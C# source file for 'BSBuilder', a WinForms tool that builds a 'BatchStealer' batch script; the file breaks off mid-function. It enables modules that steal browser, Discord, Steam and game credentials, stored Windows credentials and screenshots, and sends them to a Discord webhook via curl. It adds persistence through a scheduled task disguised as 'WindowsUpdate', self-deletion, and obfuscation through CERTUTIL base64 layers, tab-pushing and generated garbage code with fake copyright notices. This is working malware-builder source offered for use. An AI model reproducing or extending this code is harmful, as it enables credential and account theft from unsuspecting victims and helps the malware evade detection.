using System;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Linq;

//github.com/Takaovi/BSBuilder - 2021
namespace BSBuilder
{
    public partial class Form1 : Form
    {
        //ABLE TO MOVE FORM
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        string batchfetchURL = Properties.Settings.Default.fetchurl;
        string batchlocation = Properties.Settings.Default.batchlocation;
        string batch = string.Empty;

        bool forcerestart = false;
        bool acceptTOS = Properties.Settings.Default.acceptTOS;
        bool startadmin = Properties.Settings.Default.startadmin;
        bool systeminfo = Properties.Settings.Default.systeminfo;
        bool tasklist = Properties.Settings.Default.tasklist;
        bool netuser = Properties.Settings.Default.netuser;
        bool quser = Properties.Settings.Default.quser;
        bool cmdkey = Properties.Settings.Default.cmdkey;
        bool ipconfig = Properties.Settings.Default.ipconfig;
        bool screenshot = Properties.Settings.Default.screenshot;
        bool chrome = Properties.Settings.Default.chrome;
        bool opera = Properties.Settings.Default.opera;
        bool vivaldi = Properties.Settings.Default.vivaldi;
        bool firefox = Properties.Settings.Default.firefox;
        bool osu = Properties.Settings.Default.osu;
        bool discord = Properties.Settings.Default.discord;
        bool steam = Properties.Settings.Default.steam;
        bool minecraft = Properties.Settings.Default.minecraft;
        bool growtopia = Properties.Settings.Default.growtopia;
        bool recurring = Properties.Settings.Default.recurring;
        bool selfdelete = Properties.Settings.Default.selfdelete;
        bool optimize = Properties.Settings.Default.optimize;
        bool obfuscate = Properties.Settings.Default.obfuscate;
        bool confuse = Properties.Settings.Default.confuse;
        bool push = Properties.Settings.Default.push;
        bool cert = Properties.Settings.Default.cert;
        int certlayers = Properties.Settings.Default.certlayers;

        string webhook = Properties.Settings.Default.webhook;
        string reportstartmsg = Properties.Settings.Default.reportstartmsg;
        string reportendmsg = Properties.Settings.Default.reportendmsg;
        string screenshottoolurl = Properties.Settings.Default.screenshottoolurl;
        string hidepath = Properties.Settings.Default.hidepath;
        string whenscheduled = Properties.Settings.Default.whenscheduled;
        string schedulename = Properties.Settings.Default.schedulename;
        string batchcopyname = Properties.Settings.Default.batchcopyname;
        string batchupdatername = Properties.Settings.Default.batchupdatername;
        string vbname = Properties.Settings.Default.vbname;
        string updateurl = Properties.Settings.Default.updateurl;
        string targetusername = Properties.Settings.Default.targetusername;

        decimal scheduleFreq = Properties.Settings.Default.scheduleFrequency;

        static string curlmessage0 = "curl --silent --output /dev/null -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
        static string curlmessage1 = "\\\"}\"";

        void setProperties()
        {
            acceptTOScheckbox.Checked = acceptTOS;
            startadmincheckbox.Checked = startadmin;
            systeminfocheckbox.Checked = systeminfo;
            tasklistcheckbox.Checked = tasklist;
            netusercheckbox.Checked = netuser;
            qusercheckbox.Checked = quser;
            cmdkeycheckbox.Checked = cmdkey;
            ipconfigcheckbox.Checked = ipconfig;
            screenshotcheckbox.Checked = screenshot;
            chromecheckbox.Checked = chrome;
            operacheckbox.Checked = opera;
            vivaldicheckbox.Checked = vivaldi;
            firefoxcheckbox.Checked = firefox;
            osucheckbox.Checked = osu;
            discordcheckbox.Checked = discord;
            steamcheckbox.Checked = steam;
            minecraftcheckbox.Checked = minecraft;
            growtopiacheckbox.Checked = growtopia;
            recurringcheckbox.Checked = recurring;
            selfdeletecheckbox.Checked = selfdelete;
            optimizecheckbox.Checked = optimize;
            obfuscatecheckbox.Checked = obfuscate;
            confusecheckbox.Checked = confuse;
            certcheckbox.Checked = cert;
            pushcheckbox.Checked = push;
            CertLayerPicker.Value = certlayers;

            webhooktextbox.Text = webhook;
            reportstartmsgtextbox.Text = reportstartmsg;
            reportendmsgtextbox.Text = reportendmsg;
            hidepathtextbox.Text = hidepath;
            sstooltextbox.Text = screenshottoolurl;
            whenscheduledtextbox.Text = whenscheduled;
            scheduleFrequency.Value = scheduleFreq;
            schedulenametextbox.Text = schedulename;
            batchcopynametextbox.Text = batchcopyname;
            batchupdaternametextbox.Text = batchupdatername;
            vbnametextbox.Text = vbname;
            updateurltextbox.Text = updateurl;
            targetusernametextbox.Text = targetusername;

            fetchurl.Text = batchfetchURL;
            batchlocationtextbox.Text = batchlocation;

            ssgroupbox.Enabled = screenshot;
        }

        void saveProperties()
        {
            Properties.Settings.Default.fetchurl = batchfetchURL;

            Properties.Settings.Default.acceptTOS = acceptTOS;
            Properties.Settings.Default.startadmin = startadmin;
            Properties.Settings.Default.systeminfo = systeminfo;
            Properties.Settings.Default.tasklist = tasklist;
            Properties.Settings.Default.netuser = netuser;
            Properties.Settings.Default.quser = quser;
            Properties.Settings.Default.cmdkey = cmdkey;
            Properties.Settings.Default.ipconfig = ipconfig;
            Properties.Settings.Default.screenshot = screenshot;
            Properties.Settings.Default.chrome = chrome;
            Properties.Settings.Default.opera = opera;
            Properties.Settings.Default.vivaldi = vivaldi;
            Properties.Settings.Default.firefox = firefox;
            Properties.Settings.Default.osu = osu;
            Properties.Settings.Default.discord = discord;
            Properties.Settings.Default.steam = steam;
            Properties.Settings.Default.minecraft = minecraft;
            Properties.Settings.Default.growtopia = growtopia;
            Properties.Settings.Default.recurring = recurring;
            Properties.Settings.Default.selfdelete = selfdelete;
            Properties.Settings.Default.optimize = optimize;
            Properties.Settings.Default.obfuscate = obfuscate;
            Properties.Settings.Default.confuse = confuse;
            Properties.Settings.Default.push = push;
            Properties.Settings.Default.cert = cert;
            Properties.Settings.Default.certlayers = certlayers;

            Properties.Settings.Default.webhook = webhook;
            Properties.Settings.Default.reportstartmsg = reportstartmsg;
            Properties.Settings.Default.reportendmsg = reportendmsg;
            Properties.Settings.Default.screenshottoolurl = screenshottoolurl;
            Properties.Settings.Default.hidepath = hidepath;
            Properties.Settings.Default.whenscheduled = whenscheduled;
            Properties.Settings.Default.scheduleFrequency = scheduleFreq;
            Properties.Settings.Default.schedulename = schedulename;
            Properties.Settings.Default.batchcopyname = batchcopyname;
            Properties.Settings.Default.batchupdatername = batchupdatername;
            Properties.Settings.Default.vbname = vbname;
            Properties.Settings.Default.updateurl = updateurl;
            Properties.Settings.Default.targetusername = targetusername;
            Properties.Settings.Default.batchlocation = batchlocation;

            Properties.Settings.Default.Save();
        }

        public Form1()
        {
            InitializeComponent();

            this.Size = new Size(500, 761);

            setProperties();

            fetchbatch();
        }

        void fetchbatch()
        {
            var client = new WebClient();
            client.DownloadStringCompleted += (sender, e) =>
            {
                try
                {
                    batch = e.Result;
                    richtextbox.Text = batch;
                    fetchstatus.Text = "Batch file fetched from the URL";
                }
                catch
                {
                    if (batchlocation.Length != 0)
                    {
                        batch = File.ReadAllText(Path.GetFullPath(batchlocation));
                        richtextbox.Text = batch;
                        fetchstatus.Text = "Batch file loaded from local drive";
                    }
                    else
                    {
                        MessageBox.Show("Failed to load batch from " + batchfetchURL + " and no local file has been set.", "Critical error");
                    }
                }
            };

            Uri BatchURL = new Uri(batchfetchURL);
            try { client.DownloadStringAsync(BatchURL); }
            catch { MessageBox.Show("Failed to load batch from " + batchfetchURL, "Critical error"); }
        }

        void removeGOTO(string data)
        {
            batch = batch.Replace(data, string.Empty);

            data = data.Substring(5);
            data = ":" + data.PadLeft(data.Length, '0');

            batch = batch.Replace(data, string.Empty);
        }

        void removeFUNCTION(string data)
        {
            string first = data;
            data = data.Substring(5);
            data = ":" + data.PadLeft(data.Length, '0');
            string last = data;

            batch = Regex.Replace(batch, first + "\n((.+\n)+)" + last, string.Empty);
        }

        void editVAR(string original, string variable, string data)
        {
            batch = batch.Replace(original, "set \"" + variable + "=" + data + "\"");
        }

        void editCURL(string original, string data)
        {
            string newcurl = curlmessage0 + data + curlmessage1;
            batch = batch.Replace(original, newcurl);
        }

        void obfuscatebatch(string batchsource, string prefix, int pass)
        {
            //Todo
        }

        public static string Base64Encode(string plainText)
        {
            try { var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
                return Convert.ToBase64String(plainTextBytes);
            }
            catch { MessageBox.Show("You most likely added too many BASE64/CERT layers and ran out of memory.\n\nTry again with less than 30 layers.", "Memory error");
                return "Error";
            }
        }

        void confusebatch()
        {
            Random rand = new Random();

            //Amount of lines
            int phase01random = rand.Next(100, 1000);
            int phase03random = rand.Next(100, 500);

            //Variable for soon to be confused batch
            string confusedbatch = "";

            //Random bullshit commands that serve no actual purpose and will be skipped
            string[] commands = { "IF %F%==1 IF %C%==1", "   ELSE IF %F%==1 IF %C%==0", "ELSE IF %F%==0 IF %C%==1", " ELSE IF %F%==0 IF %C%==1", "goto endoftests", "   goto workdone", "set F=%date%", "   :: Fixed", "if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)", "   if %user_agrees% do", "set /p var=fd:" + "FOR /R %fo% %%G IN (.) DO (" + "   set h=%%~dpa" + "\n)" + "%t% & dir & echo %tme%", "\npause" + "\n)", "   set fi=%%~fG", "set fi=%%~fG & set /p f=f: & set F=%da% & for /f \"delims=[] t=2\" %%a ", "   set for /f \"delims=[] t=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr%", "ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1", "   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)", "timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)", "   set C=cls", "   set /A sample =1", "   fc /l %comp1% %comp2%", "for /f \"delims=[] t=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a", "   timeout /t 2 /nobreak > NUL", "   if errorlevel 1 (@echo off) else", "whoami", "   if %ERRORLEVEL% EQU 1 goto w", "move \"%source%\" \"%fs%\"", "   move \"%source%\" \"%s%\"", "cls", "if 0==1 0", "   if 0==1 0", "cd.", "call", "   call", "setlocal", "2>NUL Info > %temp%", "   2>NUL Info > %temp%", "set \"input=%~1\"", "if \"!input:~0,1!\" equ \"-\"", "set \"input=!input:~1!\"", "if \"!input:~0,1!\" equ \"+\" set \"input = !input:~1!\"", "set result=false", "   set result=true", "set wait=true", "   set wait=false", "endlocal & if \"%~2\" neq \"\" (set %~2=%result%) else echo %result%", "   echo %~1 | find /i \"help\" >nul 2>&1 && ( goto :help )", "set \"verp=%%~O\"", "   rem Please wait", "echo %~n0 [RtnVar]", "   if \"%s%\" equ \"#%~1\" endl& if \"%~3\" neq \"\" (set %~3=-1&exit /b 0)", " set \"len=0\"", "set \"s=!s:~%% A!\"", "   set /a \"len+=%%A\"", "set /A md=2*%%A", "   set /A md=2*%%A", "::set \"th=%~1\"", "call ::insert %~1r %value%", "   rem exit /b 0", "echo <wait>", "set \"hos=%~2\"", "   set \"record=%~2\"", "set \"c=%~2\"", "   goto :argPad", ":evr", "set \"us=/dR:% user %\"", "   goto :eof", "echo Started", "   echo %%1=%1 N=%N%", "echo %%1=%1 %%2=%2 %%3=%3", "set \"[=rem/||(\" & set \"]=)\"", "set \"[:=goto :]%% \"", "", "", "", "", "", "", "", "", };

            //To avoid two same commands being put in a row 
            string lastcommand = "";

            //PHASE 01 | ADD RANDOM GARBAGE COMMANDS TO THE START
            for (int i = 0; i <= phase01random; i++)
            {
                //First time
                if (i == 1)
                {
                    //Fake copyright notice ranging from 2004-2009 with a fake version
                    string[] firstnames = { "Liam", "Noah", "Oliver", "Elijah", "Olivia", "Ava", "Emma", "Charlotte", "William", "James", "Benjamin", "Lucas", "Henry", "Alexander", "Sophia", "Amelia", "Isabella", "Mia", "Evelyn", "Harper", };
                    string[] lastnames = { "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Moore", "Lee", "Robinson", "King", "Wright" };
                    confusedbatch = ":: Copyright © " + firstnames[rand.Next(1, firstnames.Length)] + " " + lastnames[rand.Next(1, lastnames.Length)] + ", 201" + rand.Next(6, 9) + "\n:: Version: " + rand.Next(1, 10) + "." + rand.Next(1, 69) + "\n:: All rights reserved. The moral rights of the author have been asserted.\n\n@echo off\ncd.\ngoto tmp";
                }
                //Execute this after the first time and before the last time
                else
                {
                    start:
                    int a = rand.Next(0, commands.Length);

                    if (commands[a] != lastcommand)
                    {
                        confusedbatch += Environment.NewLine;
                        confusedbatch += commands[a];

                        if (i == phase01random)
                        {
                            //Last time
                            confusedbatch += Environment.NewLine;
                            confusedbatch += ":tmp";
                        }
                    }
                    else goto start;

                    lastcommand = commands[a];
                }
            }

            //PHASE 02 | ADD BATCH CONTENT TO THE MIDDLE
            confusedbatch += "\n" + batch;

            //PHASE 03 | ADD RANDOM GARBAGE TO THE END
            for (int i = 0; i <= phase03random; i++)
            {
                //First time
                if (i == 1)
                {
                    confusedbatch += Environment.NewLine;
                    confusedbatch += "goto temp";
                }
                //Generally
                else
                {
                    start:
                    int a = rand.Next(0, commands.Length);

                    if (commands[a] != lastcommand)
                    {
                        confusedbatch += Environment.NewLine;
                        confusedbatch += commands[a];

                        if (i == phase03random)
                        {
                            //Last time
                            confusedbatch += Environment.NewLine;
                            confusedbatch += ":temp\nexit";
                        }
                    }
                    else goto start;

                    lastcommand = commands[a];
                }
            }
            //Finished
            batch = confusedbatch;
        }

        void AddCert(int layers)
        {
            for (int i = 0; i < layers; i++)
            {
                string onelinebatch = Base64Encode(batch);
                string cert = string.Empty;

                if (onelinebatch == "Error") break;
                else try { cert = string.Format("-----BEGIN CERTIFICATE----- {0} -----END CERTIFICATE-----", onelinebatch); } catch { MessageBox.Show("Probably too many CERT layers and you ran out of memory.", "Error"); }

                batch = "@echo off & CERTUTIL -f -decode \"%~f0\" \"%Temp%\\0.bat\" >nul 2>&1 & call \"%Temp%\\0.bat\" & Exit\n" + cert;
            }
        }

        //[PART OF THE MAIN BUILD FUNCTION]
        void Build_CONFIGSECTION()
        {
            if (startadmin)
                removeGOTO("goto skipadministrator");
            else if (optimize)
                removeFUNCTION("goto skipadministrator");

            if (selfdelete)
                removeGOTO("goto skipselfdelete");
            else if (optimize)
                removeFUNCTION("goto skipselfdelete");

            if (reportstartmsg.Length != 0)
                editCURL(curlmessage0 + "```[Report from %USERNAME% - %NetworkIP%]\\nLocal time: %HH24%:%MI%```" + curlmessage1, reportstartmsg);

            if (reportendmsg.Length != 0)
                editCURL(curlmessage0 + "```Batch Scheduled: %recurring%\\n[End of report]```" + curlmessage1, reportendmsg);

            if (webhook.Length != 0)
                editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
        }

        //[PART OF THE MAIN BUILD FUNCTION]
        void Build_INFORMATIONSECTION()
        {
            if (systeminfo)
                removeGOTO("goto skipsysteminfocapture");
            else if (optimize)
                removeFUNCTION("goto skipsysteminfocapture");

            if (tasklist)
                removeGOTO("goto skiptasklist");
            else if (optimize)
                removeFUNCTION("goto skiptasklist");

            if (netuser)
                removeGOTO("goto skipnetuser");
            else if (optimize)
                removeFUNCTION("goto skipnetuser");

            if (quser)
                removeGOTO("goto skipquser");
            else if (optimize)
                removeFUNCTION("goto skipquser");

            if (cmdkey)
                removeGOTO("goto skipcmdkey");
            else if (optimize)
                removeFUNCTION("goto skipcmdkey");

            if (ipconfig)
                removeGOTO("goto skipipconfig");
            else if (optimize)
                removeFUNCTION("goto skipipconfig");

            if (screenshot)
            {
                removeGOTO("goto skipscreenshot");

                if (screenshottoolurl.Length != 0)
                    editVAR("set \"ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true\"", "ssurl", screenshottoolurl);
            }
            else if (optimize) removeFUNCTION("goto skipscreenshot");
        }

        //[PART OF THE MAIN BUILD FUNCTION]
        void Build_STEALSECTION()
        {
            if (chrome)
                removeGOTO("goto skipchrome");
            else if (optimize)
                removeFUNCTION("goto skipchrome");

            if (opera)
                removeGOTO("goto skipopera");
            else if (optimize)
                removeFUNCTION("goto skipopera");

            if (vivaldi)
                removeGOTO("goto skipvivaldi");
            else if (optimize)
                removeFUNCTION("goto skipvivaldi");

            if (firefox)
                removeGOTO("goto skipfirefox");
            else if (optimize)
                removeFUNCTION("goto skipfirefox");

            if (osu)
                removeGOTO("goto skiposu");
            else if (optimize)
                removeFUNCTION("goto skiposu");

            if (discord)
                removeGOTO("goto skipdiscord");
            else if (optimize)
                removeFUNCTION("goto skipdiscord");

            if (steam)
                removeGOTO("goto skipsteam");
            else if (optimize)
                removeFUNCTION("goto skipsteam");

            if (minecraft)
                removeGOTO("goto skipminecraft");
            else if (optimize)
                removeFUNCTION("goto skipminecraft");

            if (growtopia)
                removeGOTO("goto skipgrowtopia");
            else if (optimize)
                removeFUNCTION("goto skipgrowtopia");
        }

        //[PART OF THE MAIN BUILD FUNCTION]
        void Build_RECURRINGSECTION()
        {
            //Optimize (Recurring won't be deleted otherwise)
            if (optimize)
            {
                batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
            }

            //Recurring (Allow batch to be executed again)
            if (recurring)
            {
                removeGOTO("goto skiprecurring");

                if (hidepath.Length != 0)
                    editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);

                if (whenscheduled.Length != 0 && scheduleFreq != 0)
                    editVAR("set \"when=Daily\"", "when", whenscheduled + " " + freq_arg + " " + scheduleFreq);
                else
                    editVAR("set \"when=Daily\"", "when", whenscheduled);

                if (schedulename.Length != 0)
                    editVAR("set \"ScheduleName=WindowsUpdate\"", "ScheduleName", schedulename);

                if (batchcopyname.Length != 0)
                    editVAR("set \"bname=0.bat\"", "bname", batchcopyname);

                if (batchupdatername.Length != 0)
                    editVAR("set \"uname=1.bat\"", "uname", batchupdatername);

                if (vbname.Length != 0)
                    editVAR("set \"vname=0.vbs\"", "vname", vbname);

                if (updateurl.Length != 0)
                    editVAR("set \"updateurl=\"", "updateurl", updateurl);

                if (targetusername.Length != 0)
                    editVAR("set \"targetusername=\"", "targetusername", targetusername);
            }
            else if (optimize)
                removeFUNCTION("goto skiprecurring");
        }

        //[PART OF THE MAIN BUILD FUNCTION]
        void Build_MISCSECTION()
        {
            //Obfuscate (Todo)
            if (obfuscate)
                obfuscatebatch(batch, "takaovi", 1);

            //Optimize (Remove empty lines, spaces and comments)
            if (optimize)
            {
                batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
                batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
                batch = Regex.Replace(batch, @"\t", string.Empty, RegexOptions.Multiline);
                batch = Regex.Replace(batch, @"[\n\r]+$", string.Empty, RegexOptions.Multiline);
            }

            //Base64 (Encode)
            if (cert)
            {
                AddCert(certlayers);
            }

            //Push (Pushes the batch script to the side, makes it harder to read if using default text editors)
            if (push)
            {
                string pushside = String.Concat(Enumerable.Repeat("\t", 99999));
                batch = Regex.Replace(batch, @"^", pushside, RegexOptions.Multiline);
            }

            //Confuse (Adds garbage code around the actual malicious code)
            if (confuse)
            {
                confusebatch();
            }
        }

        //[MAIN BUILD FUNCTION]
        void BuildBatchStealer()
        {
            if (forcerestart) { Application.Restart(); } else
            {
                //If there's a batch file to be edited
                if (batch.Length != 0)
                {
                    //If user has agreed to follow the TOS
                    if (acceptTOS) removeGOTO("goto remove_this_if_you_agree_to_follow_the_TOS");

                    //Build/Edit/Remove the config section's functions
                    Build_CONFIGSECTION();

                    //Build/Edit/Remove the information section's functions
                    Build_INFORMATIONSECTION();

                    //Build/Edit/Remove the steal section's functions
                    Build_STEALSECTION();

                    //Build/Edit/Remove the recurring section's functions
                    Build_RECURRINGSECTION();

                    //Build/Edit/Remove the misc section's functions
                    Build_MISCSECTION();

                    //Write the BatchStealer file
                    using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat")) { wt.Write(batch); }

                    /*
                    richtextbox.Text = batch;
                    Builderbox.Enabled = false;
                    acceptTOScheckbox.Enabled = false;
                    forcerestart = true;
                    buildbutton.Text = "Restart the program";
                    */

                    //Restart BSBuilder application for reasons
                    Application.Restart();
                }
                else { //No batch was set
                    MessageBox.Show("Could not build, missing batch script.", "Critical Error");
                }
            }
        }

        string freq_arg = "/mo";

        private void whenscheduledtextbox_SelectedIndexChanged(object sender, EventArgs e)
        {
            whenscheduled = whenscheduledtextbox.Text;

            switch (whenscheduled)
            {
                case "Minute":
                    freqlabel.Text = "Every (1 - 1439 minutes)";
                    scheduleFrequency.Maximum = 1439;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Hourly":
                    freqlabel.Text = "Every (1 - 23 hours)";
                    scheduleFrequency.Maximum = 23;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Daily":
                    freqlabel.Text = "Every (1 - 365 days)";
                    scheduleFrequency.Maximum = 365;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Weekly":
                    freqlabel.Text = "Every (1 - 52 weeks)";
                    scheduleFrequency.Maximum = 52;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Monthly":
                    freqlabel.Text = "1st - 12th month)";
                    scheduleFrequency.Maximum = 12;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Onlogon":
                    freqlabel.Text = "Frequency (None)";
                    scheduleFrequency.Maximum = 0;
                    scheduleFrequency.Value = 0;
                    freq_arg = "";
                    if (!startadmin) {
                        MessageBox.Show("Please enable 'Start as Administrator' before changing this to '" + whenscheduledtextbox.Text + "'. Otherwise the batch file won't be scheduled.\n\nYour batch file will not ask for administrator when started by the scheduler. It will stay hidden.", "Incorrect settings");
                        whenscheduledtextbox.Text = "Daily";
                    }
                    break;

                case "Once":
                    freqlabel.Text = "Frequency (None)";
                    scheduleFrequency.Maximum = 0;
                    scheduleFrequency.Value = 0;
                    freq_arg = "";
                    break;

                case "Onidle":
                    freqlabel.Text = "After idle (1 - 1439 minutes)";
                    scheduleFrequency.Maximum = 1439;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/i";
                    break;
            }
        }

        private void openfolder_Click(object sender, EventArgs e)
        {
            Process.Start(AppDomain.CurrentDomain.BaseDirectory);
        }

        private void webhooktextbox_TextChanged(object sender, EventArgs e)
        {
            webhook = webhooktextbox.Text;
        }

        private void reportstartmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            reportstartmsg = reportstartmsgtextbox.Text;
        }

        private void reportendmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            reportendmsg = reportendmsgtextbox.Text;
        }

        private void hidepathtextbox_TextChanged(object sender, EventArgs e)
        {
            hidepath = hidepathtextbox.Text;
        }

        private void schedulenametextbox_TextChanged(object sender, EventArgs e)
        {
            schedulename = schedulenametextbox.Text;
        }

        private void batchcopynametextbox_TextChanged(object sender, EventArgs e)
        {
            batchcopyname = batchcopynametextbox.Text;
        }

        private void batchupdaternametextbox_TextChanged(object sender, EventArgs e)
        {
            batchupdatername = batchupdaternametextbox.Text;
        }

        private void vbnametextbox_TextChanged(object sender, EventArgs e)
        {
            vbname = vbnametextbox.Text;
        }

        private void updateurltextbox_TextChanged(object sender, EventArgs e)
        {
            updateurl = updateurltextbox.Text;
        }

        private void targetusernametextbox_TextChanged(object sender, EventArgs e)
        {
            targetusername = targetusernametextbox.Text;
        }

        private void fetchurl_TextChanged(object sender, EventArgs e)
        {
            batchfetchURL = fetchurl.Text;
        }

        private void scheduleFrequency_ValueChanged(object sender, EventArgs e)
        {
            scheduleFreq = scheduleFrequency.Value;
        }

        private void sstooltextbox_TextChanged(object sender, EventArgs e)
        {
            screenshottoolurl = sstooltextbox.Text;
        }


        private void acceptTOScheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (acceptTOScheckbox.Checked)
            {
                acceptTOS = true;
                allpanel.Enabled = true;
                panel3.Enabled = true;
            }
            else
            {
                acceptTOS = false;
                allpanel.Enabled = false;
                panel3.Enabled = false;
            }
        }

        private void startadmincheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (startadmincheckbox.Checked)
            {
                startadmin = true;
            }
            else
            {
                startadmin = false;
            }
        }

        private void selfdeletecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (selfdeletecheckbox.Checked)
            {
                selfdelete = true;
            }
            else
            {
                selfdelete = false;
            }
        }

        private void systeminfocheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (systeminfocheckbox.Checked)
            {
                systeminfo = true;
            }
            else
            {
                systeminfo = false;
            }
        }

        private void tasklistcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (tasklistcheckbox.Checked)
            {
                tasklist = true;
            }
            else
            {
                tasklist = false;
            }
        }

        private void netusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (netusercheckbox.Checked)
            {
                netuser = true;
            }
            else
            {
                netuser = false;
            }
        }

        private void qusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (qusercheckbox.Checked)
            {
                quser = true;
            }
            else
            {
                quser = false;
            }
        }

        private void cmdkeycheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (cmdkeycheckbox.Checked)
            {
                cmdkey = true;
            }
            else
            {
                cmdkey = false;
            }
        }

        private void chromecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (chromecheckbox.Checked)
            {
                chrome = true;
            }
            else
            {
                chrome = false;
            }
        }

        private void operacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (operacheckbox.Checked)
            {
                opera = true;
            }
            else
            {
                opera = false;
            }
        }

        private void vivaldicheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (vivaldicheckbox.Checked)
            {
                vivaldi = true;
            }
            else
            {
                vivaldi = false;
            }
        }

        private void firefoxcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (firefoxcheckbox.Checked)
            {
                firefox = true;
            }
            else
            {
                firefox = false;
            }
        }

        private void osucheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (osucheckbox.Checked)
            {
                osu = true;
            }
            else
            {
                osu = false;
            }
        }

        private void discordcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (discordcheckbox.Checked)
            {
                discord = true;
            }
            else
            {
                discord = false;
            }
        }

        private void steamcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (steamcheckbox.Checked)
            {
                steam = true;
            }
            else
            {
                steam = false;
            }
        }

        private void minecraftcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (minecraftcheckbox.Checked)
            {
                minecraft = true;
            }
            else
            {
                minecraft = false;
            }
        }

        private void growtopiacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (growtopiacheckbox.Checked)
            {
                growtopia = true;
            }
            else
            {
                growtopia = false;
            }
        }

        private void recurringcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (recurringcheckbox.Checked)
            {
                recurring = true;
                recurringpanel.Enabled = true;
            }
            else
            {
                recurring = false;
                recurringpanel.Enabled = false;
            }
        }

        private void optimizecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (optimizecheckbox.Checked)
            {
                optimize = true;
            }
            else
            {
                optimize = false;
            }
        }

        private void obfuscatecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (obfuscatecheckbox.Checked)
            {
                obfuscate = true;
            }
            else
            {
                obfuscate = false;
            }
        }

        private void ipconfigcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (ipconfigcheckbox.Checked)
            {
                ipconfig = true;
            }
            else
            {
                ipconfig = false;
            }
        }

        private void confusecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (confusecheckbox.Checked)
            {
                confuse = true;
            }
            else
            {
                confuse = false;
            }
        }

        private void screenshotcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (screenshotcheckbox.Checked)
            {
                screenshot = true;
                ssgroupbox.Enabled = true;
            }
            else
            {
                screenshot = false;
                ssgroupbox.Enabled = false;
            }
        }

        private void certcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (certcheckbox.Checked)
            {
                cert = true;
                selfdelete = true;
                selfdeletecheckbox.Checked = true;
                if(startadmin)
                {
                    startadmin = false;
                    startadmincheckbox.Checked = false;
                }
            }
            else
            {
                cert = false;
                selfdelete = false;
                selfdeletecheckbox.Checked = false;
            }
        }

        private void pushcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (pushcheckbox.Checked)
            {
                push = true;
            }
            else
            {
                push = false;
            }
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void label13_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void buildbutton_Click(object sender, EventArgs e)
        {
            BuildBatchStealer();
        }

        private void searchbatchbutton_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
            file.Title = "Select the bat you want to build (Needs to be BatchStealer)";
            file.Filter = "Batch script (*.bat*)|*.bat*";
            file.RestoreDirectory = true;
            if (file.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    batch = File.ReadAllText(Path.GetFullPath(file.FileName));
                    richtextbox.Text = batch;

                    batchlocation = Path.GetFullPath(file.FileName);
                    batchlocationtextbox.Text = batchlocation;

                    if (batch.Length != 0) { fetchstatus.Text = "Batch file loaded from local drive"; }
                }
                catch
                {
